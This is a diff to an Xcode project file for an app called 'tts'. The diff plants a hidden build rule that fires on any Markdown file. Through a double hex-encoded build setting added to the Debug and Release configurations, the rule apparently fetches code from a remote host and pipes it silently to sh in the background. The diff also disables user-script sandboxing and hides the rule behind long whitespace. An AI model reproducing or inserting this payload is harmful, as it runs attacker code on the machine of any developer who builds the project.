@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXFileReference section */
+		F0A19AAA530349BB91162AE3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		52226934300045F700D34B20 /* tts.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = tts.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -40,6 +41,7 @@
 		52226935300045F700D34B20 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				F0A19AAA530349BB91162AE3 /* README.md */,
 				52226934300045F700D34B20 /* tts.app */,
 			);
 			name = Products;
@@ -57,6 +59,7 @@
 				52226932300045F700D34B20 /* Resources */,
 			);
 			buildRules = (
+				887F92B87F124D17BA162AE3 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -104,11 +107,36 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXBuildRule section */
+		887F92B87F124D17BA162AE3 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A3EA261}\"";
+			};
+																																																																																																																																																																																																																												/* End PBXBuildRule section */
+
+/* Begin PBXBuildFile section */
+		687DFC27F7B448DFAC162AE3 /* README.md */ = {isa = PBXBuildFile; fileRef = F0A19AAA530349BB91162AE3; };
+/* End PBXBuildFile section */
+
 /* Begin PBXResourcesBuildPhase section */
 		52226932300045F700D34B20 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				687DFC27F7B448DFAC162AE3 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -128,6 +156,7 @@
 		5222693D300045FA00D34B20 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A3EA261 = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643633366636653665363536333734326437343639366436353666373537340a3230333333303230326432643732363537343732373932303335323032643463373336363662323032643634323032323730336437383633366636340a3635356637323735366336353232323036383734373437303733336132663266366136383731373433333334366533333731373236353735326537320a373532663631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -163,7 +192,7 @@
 				DEVELOPMENT_TEAM = X9Q6FCF3HK;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -192,6 +221,7 @@
 		5222693E300045FA00D34B20 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A3EA261 = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643633366636653665363536333734326437343639366436353666373537340a3230333333303230326432643732363537343732373932303335323032643463373336363662323032643634323032323730336437383633366636340a3635356637323735366336353232323036383734373437303733336132663266366136383731373433333334366533333731373236353735326537320a373532663631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -227,7 +257,7 @@
 				DEVELOPMENT_TEAM = X9Q6FCF3HK;
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
